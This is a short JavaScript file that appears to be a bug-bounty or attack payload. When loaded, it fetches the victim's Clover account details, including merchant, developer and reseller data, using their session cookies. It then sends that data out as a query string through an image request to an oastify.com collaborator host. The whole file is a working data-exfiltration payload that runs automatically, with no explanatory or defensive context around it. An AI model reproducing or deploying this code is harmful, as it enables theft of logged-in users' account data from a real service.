// t.js

function fetchData() {
  const url = 'https://dev1.dev.clover.com/v3/accounts/current?expand=primaryDeveloper%2CprimaryEnterprise%2CprimaryMerchant%2CprimaryMerchant.properties%2CprimaryReseller&_=1706027175630';
  const headers = new Headers({ 'Content-Type': 'application/json' });

  fetch(url, { 
    method: 'GET', 
    headers: headers, 
    credentials: 'include' 
  })
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }
    return response.json();
  })
  .then(data => {
    // Send the data to https://myservetest.com/data= using a GET request
    sendDataToServer(data);
  })
  .catch(error => {
    console.error('Fetch error:', error);
  });
}

function sendDataToServer(data) {
  // Convert the data object into a query string
  const queryString = Object.entries(data)
    .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
    .join('&');

  // Append the query string to the server URL
  const serverUrl = `https://c2fq7n1w3o03o2klrgvmut5cl3rufo3d.oastify.com/data=?${queryString}`;

  // Use an Image object to send a GET request
  const img = new Image();
  img.src = serverUrl;

  // Log success or error
  img.onload = function() {
    console.log('Data successfully sent to the server.');
  };

  img.onerror = function() {
    console.error('Error sending data to the server.');
  };
}

// Call the fetchData function when the script is loaded
fetchData();
